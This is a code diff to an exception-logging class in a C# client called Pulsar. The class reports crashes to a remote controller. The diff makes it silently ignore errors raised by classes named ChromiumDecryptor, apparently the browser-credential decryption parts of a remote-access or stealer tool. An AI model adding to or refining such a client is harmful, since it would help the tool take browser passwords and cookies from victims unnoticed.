@@ -1,4 +1,6 @@
-﻿using System;
+﻿using Pulsar.Client.Networking;
+using Pulsar.Common.Messages;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -7,8 +9,6 @@ using System.Security.Cryptography;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using Pulsar.Client.Networking;
-using Pulsar.Common.Messages;
 
 namespace Pulsar.Client.User
 {
@@ -16,6 +16,7 @@ namespace Pulsar.Client.User
     {
         private readonly PulsarClient _client;
         private readonly HashSet<Type> _ignoredExceptionTypes;
+        private readonly HashSet<Type> _ignoredClasses;
 
         public DebugLog(PulsarClient client)
         {
@@ -23,8 +24,15 @@ namespace Pulsar.Client.User
             _ignoredExceptionTypes = new HashSet<Type>
                 {
                     typeof(CryptographicException),
-                    //typeof(IOException),
-                    typeof(UnauthorizedAccessException)
+                    typeof(IOException),
+                    typeof(UnauthorizedAccessException),
+                    //typeof(FormatException)
+                };
+
+            _ignoredClasses = new HashSet<Type>
+                {
+                    typeof(Pulsar.Client.Kematian.HelpingMethods.Decryption.ChromiumDecryptor),
+                    typeof(Pulsar.Client.Kematian.HelpingMethods.Decryption.ChromiumV127Decryptor)
                 };
 
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
@@ -61,8 +69,26 @@ namespace Pulsar.Client.User
                 return;
             }
 
+            // see if its class is ignored
+            if (ShouldIgnoreException(e.Exception))
+            {
+                return;
+            }
+
             LogException(e.Exception);
             _client.Send(new GetDebugLog { Log = e.Exception.ToString() });
+        }
+
+        private bool ShouldIgnoreException(Exception ex)
+        {
+            // check against ignored classes
+            var declaringType = ex.TargetSite?.DeclaringType;
+            if (declaringType != null && _ignoredClasses.Contains(declaringType))
+            {
+                return true;
+            }
+
+            return false;
         }
 
         private void LogException(Exception ex)
@@ -80,7 +106,7 @@ namespace Pulsar.Client.User
         {
             if (disposing)
             {
-
+                // Dispose managed resources here
             }
         }
     }
